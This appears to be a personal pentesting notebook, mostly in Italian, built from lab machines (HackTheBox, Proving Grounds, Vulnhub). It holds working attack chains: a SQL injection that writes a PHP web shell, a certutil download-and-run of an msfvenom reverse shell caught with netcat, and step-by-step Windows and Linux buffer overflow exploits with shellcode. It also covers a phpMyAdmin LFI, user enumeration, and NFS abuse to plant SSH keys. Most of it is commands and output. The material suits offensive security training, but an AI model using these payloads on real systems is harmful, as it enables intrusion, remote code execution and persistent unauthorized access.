Usato qui: https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html


### SQLi
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

#### Trovare colonne
https://portswigger.net/web-security/sql-injection/union-attacks
```
' ORDER BY 1--
```
oppure:
```
' UNION SELECT NULL--
```

#### Esempi
Se vuoi altri esempi di macchine che hai fatto, vedi Chris, Mail

https://book.hacktricks.xyz/pentesting-web/sql-injection
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

Error Based:

http://192.168.128.127:33033/slug?URL=%27%20AND%20extractvalue(rand(),concat(0x3a,version()))%20%20--%20

Mysql2::Error: XPATH syntax error: ':10.4.14-MariaDB'   


Se si scopre di avere una SQLi, si può provare anche ad inserire uno script php per avere una RCE:
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

Per testare che effettivamente è stata creata:
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=dir"
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\xampp\htdocs

11/09/2020  08:46 AM    <DIR>          .
11/09/2020  08:46 AM    <DIR>          ..
11/09/2020  08:46 AM                35 cmd.php
11/03/2020  11:13 AM               887 index.html
11/03/2020  11:16 AM                21 phpinfo.php
11/03/2020  11:13 AM             3,023 script.js
11/03/2020  11:14 AM             1,266 styles.css
               5 File(s)          5,232 bytes
               2 Dir(s)   1,602,994,176 bytes free
```


E quindi, per esempio, si può creare un payload per una reverse shell, caricare sulla macchina ed eseguirla, tramite lo script php caricato tramite SQLi:
```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=30021 -f exe -o reverse.exe      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

We’ll start a python web server listening on port 45332.
```
kali@kali:~$ python3 -m http.server 45332                
Serving HTTP on 0.0.0.0 port 45332 (http://0.0.0.0:45332/) ...
```

Next, we can use our web shell to download the payload to the target with certutil. Note that we need to URL-encode our command.
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=certutil+-f+-urlcache+http://192.168.118.8:45332/reverse.exe+reverse.exe"
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Let’s start a Netcat listener on port 30021.
```
kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...
```

Finally, we will use the web shell to execute our payload.
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=reverse.exe"
...
```

The Netcat output indicates that we have received our reverse shell:
```
kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49946
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
medjed\jerren
```


Vedi anche https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html


#### SQLi error based
Vedi Medjed di Proving Grounds.
https://zeyu2001.gitbook.io/pentesting/proving-grounds/get-to-work/medjed

### PhpMyAdmin
La versione 4.8.0 vulnerabile a CVE-2018-12613.
Si può fare LFI tramite http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd

E si può iniettare codice php per fare una reverse shell, vedi https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html


### BoF

##### Windows
1. Cambiare IP e PORT in fuzzer.py
2. Eseguire fuzzer.py per trovare il numero di bytes per far crashare l'applicativo

3. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l #bytes_trovati_al_punto_2 + 400

4. Resettare in exploit.py i valori di: (Cambiare anche IP e PORT)
- buffer_size = 0
- offset = 0
- overflow = "A" * offset
- retn = ""
- nop_size = 0
- padding = "" * nop_size
- payload = ""

5. Inserire il valore trovato al punto 2 in **buffer_size** e la stringa generata al punto 3 in **payload**

6. Nella macchina Windows avviare Immunity Debugger con l'applicativo ed eseguire:
- !mona config -set workingfolder c:\mona\%p

7. Eseguire exploit.py

8. Andare nella macchina Windows e l'applicativo ha crashato, eseguire:
- !mona findmsp -distance #bytes_trovati_al_punto_2 + 400

Questo ci darà il valore dell'offset. **N.B prendere offset scritto nella riga dell'EIP**

9. Sostituire il valore dell'offset trovato al punto 8, in exploit.py alla variabile **offset** (LOL, ovviamente xD)

10. Inserire "BBBB" in exploit.py nella variabile **retn** (commentare la riga di codice ```buffer += struct.pack('<I', retn)``` e inserire ```buffer += retn``` altrimenti dà errore)
Questo per testare che effettivamente viene inserito "BBBB" nel return address con l'offset che abbiamo inserito.

11. Trovare i bad character
12. Creare un array di byte su immunity debugger ```!mona bytearray -b "\x00"```
13. Exeguire generate_bad_chars.py e copiare il payload in exploit.py ed eseguirlo

14. Andare su immunity debugger ed eseguire ```!mona compare -f C:\mona\oscp\bytearray.bin -a addr_esp``` (esattamente così ```!mona compare -f C:\mona\oscp\bytearray.bin -a addr_esp```) (attenta al path) e sostituire l'indirizzo dell'esp 
15. Se ci sono bad characters rifare il giro dal punto 12 aggiungendo i caratteri

16. Una volta trovati i bad characters ```!mona jmp -r esp -cpb "\x00\x08\x2c\xad"``` (sostituire nelle virgolette, i bad characters trovati prima)
17. Prendere uno degli indirizzi che escono dal punto 16 e inserirlo in exploit.py in retn (esattamente così 0x311712f3) (rimettere la riga di codice ```buffer += struct.pack('<I', retn)```)

18. Generare shellcode ```msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.159 LPORT=5555 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f py -v payload``` (dipende che sistema si ha)

19. Inserire il payload in exploit.py in questo formato:
payload = ("\xba\x13\x24\xb9\x47\xda\xc3\xd9\x74\x24\xf4\x5e"
"\x2b\xc9\xb1\x12\x83\xc6\x04\x31\x56\x0e\x03\x45"
"\x2a\x5b\xb2\x58\xe9\x6c\xde\xc9\x4e\xc0\x4b\xef"
"\xd9\x07\x3b\x89\x14\x47\xaf\x0c\x17\x77\x1d\x2e"
"\x1e\xf1\x64\x46\x61\xa9\x96\xeb\x09\xa8\x98\x06"
"\x79\x25\x79\x98\x1b\x66\x2b\x8b\x50\x85\x42\xca"
"\x5a\x0a\x06\x64\x0b\x24\xd4\x1c\xbb\x15\x35\xbe"
"\x52\xe3\xaa\x6c\xf6\x7a\xcd\x20\xf3\xb1\x8e")

Aggiungere anche:
nop_size = 20
padding = "\x90" * nop_size

20. Mettere in listening ed eseguire exploit.py



##### Linux

1. Trovare la lunghezza di stringa che fa crashare l'applicativo, per generare si può eseguire da gdb:
```run $(python -c "print('A'*100)")```

Aumentando fino a che non crasha

2. Trovata la lunghezza (in questo caso 200), generare il payload:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

3. Rieseguire l'applicativo con la stringa generata al punto 2:
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x39644138 in ?? ()
```

4. Per trovare l'offset, si prende l'indirizzo di memoria che dà gdb quando l'applicativo crasha:
```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39644138 
[*] Exact match at offset 116
```

5. Si testa se effettivamente l'offset è giusto:
```
(gdb) run $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c "print('A'*116 + 'BBBB' + 'C'*(200-116-4))")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```



6. Si deve trovare il return address: (l'applicativo in questo caso si chiama **validate**)
objdump -D *nome_applicativo* | grep call| grep eax
```
└─$ objdump -D validate | grep call| grep eax
 8048468:	ff 14 85 14 9f 04 08 	call   *0x8049f14(,%eax,4)
 80484af:	ff d0                	call   *%eax
 804862b:	ff d0                	call   *%eax
```

7. Ora si può inserire una shellcode con il return address: (In questo caso la shellcode stampa solo la stringa "Owned!!!")
```
gdb-peda$ run $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")


Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python2.7 -c "import struct; shellcode='\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80'; print('\x90'*10+shellcode +'A'*(116-10-len(shellcode)) + struct.pack('<I', 0x080484af))")
Owned!!![Inferior 1 (process 101558) exited normally]
```

**shellcode for /bin/sh**
shellcode =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x5
8\xcd\x80"

**Oppure si può generare con:**
msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 -b ‘x00x0ax0dx20x46’ -e x86/shikata_ga_nai -f c


Per i bad characters:
```
run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
```

Cioè:
```
gdb-peda$ run $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")
Starting program: /home/kali/Documents/Vulnhub/Brainpan1/validate $(python -c"print('A'*116+'BBBB'+'\x90'*16+'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')")

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcce8 ('A' <repeats 116 times>, "BBBB", '\302\220' <repeats 16 times>, "\001\002\003\004\005\006\a\b")
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd0d0 --> 0xd0c0b00 ('')
EDX: 0xffffcd88 --> 0x0 
ESI: 0xf7fa9000 --> 0x1e4d6c 
EDI: 0xf7fa9000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcd60 --> 0x90c290c2 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcd60 --> 0x90c290c2 
0004| 0xffffcd64 --> 0x90c290c2 
0008| 0xffffcd68 --> 0x90c290c2 
0012| 0xffffcd6c --> 0x90c290c2 
0016| 0xffffcd70 --> 0x90c290c2 
0020| 0xffffcd74 --> 0x90c290c2 
0024| 0xffffcd78 --> 0x90c290c2 
0028| 0xffffcd7c --> 0x90c290c2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

L'applicativo crasha e si vede la memoria con il comando ```x/100x $eax```
```
gdb-peda$ x/100x $eax
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd58:	0x41414141	0x42424242	0x90c290c2	0x90c290c2
0xffffcd68:	0x90c290c2	0x90c290c2	0x90c290c2	0x90c290c2
0xffffcd78:	0x90c290c2	0x90c290c2	0x04030201	0x08070605
0xffffcd88:	0x00000000	0xf7de2e46	0x00000004	0xffffce34
0xffffcd98:	0xffffce48	0xffffcdc4	0xffffcdd4	0xf7ffdb40
0xffffcda8:	0xf7fca410	0xf7fa9000	0x00000001	0x00000000
0xffffcdb8:	0xffffce18	0x00000000	0xf7ffd000	0x00000000
0xffffcdc8:	0xf7fa9000	0xf7fa9000	0x00000000	0x6359a04d
0xffffcdd8:	0x20997e5d	0x00000000	0x00000000	0x00000000
0xffffcde8:	0x00000004	0x08048400	0x00000000	0xf7fe88f0
0xffffcdf8:	0xf7fe3230	0xf7ffd000	0x00000004	0x08048400
0xffffce08:	0x00000000	0x08048421	0x08048538	0x00000004
0xffffce18:	0xffffce34	0x080485b0	0x080485a0	0xf7fe3230
0xffffce28:	0xffffce2c	0x0000001c	0x00000004	0xffffd000
0xffffce38:	0xffffd030	0xffffd0d1	0xffffd0e7	0x00000000
0xffffce48:	0xffffd247	0xffffd275	0xffffd2c1	0xffffd2d3
0xffffce58:	0xffffd2e3	0xffffd2fc	0xffffd329	0xffffd359
0xffffce68:	0xffffd397	0xffffd3b8	0xffffd3c2	0xffffd3d8
```

All'indirizzo di memoria 0xffffcd78 si vede che il payload che ho inserito arriva fino a \x08 e poi c'è \x00 nell'indirizzo di memoria successivo, questo vuol dire che \x09 è un bad characters

E si continua così fino a quando o il payload è troppo lungo e quindi l'applicativo non crasha, oppure crasha ma ci sono tutti i caratteri che si sono inseriti nel payload



### SMTP (port 23)
```
└─$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.102
```

Con metasploit: auxiliary/scanner/smtp/smtp_enum


### Linux fingerd (port 79)

Con metasploit: auxiliary/scanner/finger/finger_users

Per enumerazione utenti: (Sta in **~/Programs**)
https://github.com/Kan1shka9/Finger-User-Enumeration
```
./finger_enum_user.sh ~/Documents/Vulnhub/Hacklab_Vulnix/user.txt
```

Sample output:
```
$ ./finger_enum_user.sh users.txt
User : user
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash
Last login Tue May 16 01:47 (BST) on pts/0 from 192.168.1.34
No mail.
No Plan.

Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false
Never logged in.
No mail.
No Plan.
```

N.B Check for the parameter "Directory:" in the output, if /home/username means that it is a valid user on the system.



### NFS (Port 2049)
Con nmap:
```
sudo nmap -p 111 — script=nfs-ls,nfs-statfs,nfs-showmount 10.10.119.18
```

Manuale:
```
└─$ showmount -e 192.168.1.102
Export list for 192.168.1.102:
/home/vulnix *
``` 
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mkdir home2

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ mount -t nfs 192.168.1.102:/home/vulnix home2 -o nolock
```

Oppure usare **nfsshell**:
```
└─$ sudo ./nfsshell
nfs> host 192.168.1.102
Using a privileged port (1023)
Open 192.168.1.102 (192.168.1.102) TCP
nfs> export
Export list for 192.168.1.102:
/home/vulnix             * 
nfs> mount ~/Documents/Vulnhub/Hacklab_Vulnix/home/
Using a privileged port (1022)
Mount failed: Permission denied
```

In questo caso non ho i permessi per vedere il contenuto della cartella però utilizzando i comandi ```uid``` e ```gid``` posso settare i permessi giusti dell'utente per vedere il contenuto.
Quindi metti caso che sei entrato in ssh con un utente, tu prendi da /etc/passwd 
```
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

Si può o settare l'uid con nfsshell:
```
nfs> uid 2008
nfs> ls
.
..
.bash_history
.bash_logout
.bashrc
.cache
.profile
```

Oppure si può aggiungere nella propria macchina un utente con quell'uid:
```
└─$ sudo useradd -u 2008 vulnix
                                                                                                                  
(base) ┌──(kali㉿kali)-[~/Programs/unix-privesc-check-1.4]
└─$ tail /etc/passwd
king-phisher:x:132:140::/var/lib/king-phisher:/usr/sbin/nologin
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
pwn:x:1004:1004:,,,:/home/pwn:/bin/bash
uuidd:x:134:143::/run/uuidd:/usr/sbin/nologin
ftpuser:x:1006:1006::/dev/null:/etc
ftp:x:133:142:ftp daemon,,,:/var/ftp:/bin/false
beef-xss:x:135:144::/var/lib/beef-xss:/usr/sbin/nologin
redis:x:136:145::/var/lib/redis:/usr/sbin/nologin
vulnix:x:2008:2008::/home/vulnix:/bin/sh
```

E poi si monta la directory da root e poi si passa all'utente creato:
```
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─$ mount -t nfs 192.168.1.102:/home/vulnix /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home -o nolock
                                                                                                                                                               
┌──(root💀kali)-[/home/kali/Programs/unix-privesc-check-1.4]
└─# su vulnix
$ cd /home/kali/Documents/Vulnhub/Hacklab_Vulnix/home
$ ls -la
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```

Poi per continuare l'attacco, si può inserire una chiave ssh in questa directory:
1. Genero chiave:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh-keygen            
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa_vulnix
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa_vulnix
Your public key has been saved in id_rsa_vulnix.pub
The key fingerprint is:
SHA256:NFEWBOcRexrVCkXFRoIUFL0NkfUN63ZRxPmWcRm27kw kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|        o*&X*O==*|
|         =o++.=B*|
|        o +..*.oB|
|       . . +o.o.+|
|        S .   oE.|
|             .+. |
|               o |
|                 |
|                 |
+----[SHA256]-----+

(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ cat id_rsa_vulnix.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali
```

2. Copio il .pub nelle authorized key della macchina:
```
$ mkdir .ssh
$ ls
$ ls -la
total 24
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 .
drwxr-xr-x 3 kali   kali   4096 Jun  6 11:20 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:19 .ssh
$ cd .ssh	
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa2oTKTIzaYCieWckD9XLCr5FDTwPK2QTfB8JG5P8T6sULeZc0jLCeHEKcFuLGhGVfgBeKLvoOvR9i+LcLqpCTKmNnRmkFdBnUXCB2t5A8RMaLwxU7oKThCVrgB9yX7ccDD4NTHjh9DvfS0ePSqF5Vl3D0UQyLo51aK9sowhlQ9qUOigI0SKQOJRl2i/EZr5MeJlwZICiYn6xRi/TOUca2rz4gwlefoxdHtzNJu6Zk7lMrVEjh0+DZdAjsru6CZPIRaZsPCS995LSRnh0HDk4GFbmekeNmftRxMKGrJqbsCE6x7IoqERRga10mFjjMgz3BTgyjCsKjrqV/TM5Ed2BAA9YsSwXtYOXqnI5WL0deTzw2xqCox25nS8LZwzoF89tXfwEYl5OOBmF7BokmfFVH1dTGZ1POP84rPcZT2eHivAiL17kOrJOUBGpKGkDpYsWA7SlbMJU88W+7UnZkkUtoc9NI0UyMZ3f6eSDyqkPjkZKcm/3kj3FM9TNvR/BhsL8= kali@kali >  authorized_keys
$ ls -la
total 12
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 07:20 .
drwxr-x--- 3 vulnix vulnix 4096 Jun  6 07:19 ..
-rw-r--r-- 1 vulnix vulnix  563 Jun  6 07:20 authorized_keys
```

3. Accedo in ssh:
```
(base) ┌──(kali㉿kali)-[~/Documents/Vulnhub/Hacklab_Vulnix]
└─$ ssh -i id_rsa_vulnix vulnix@192.168.1.102
Enter passphrase for key 'id_rsa_vulnix': 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jun  6 12:21:14 BST 2021

  System load:  0.0              Processes:           88
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 12%              IP address for eth0: 192.168.1.102
  Swap usage:   0%

  => / is using 90.3% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$ ls -la
total 28
drwxr-x--- 4 vulnix vulnix 4096 Jun  6 12:21 .
drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix 4096 Jun  6 12:21 .cache
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix 4096 Jun  6 12:20 .ssh
```

In nfs c'è questa impostazione root_squash
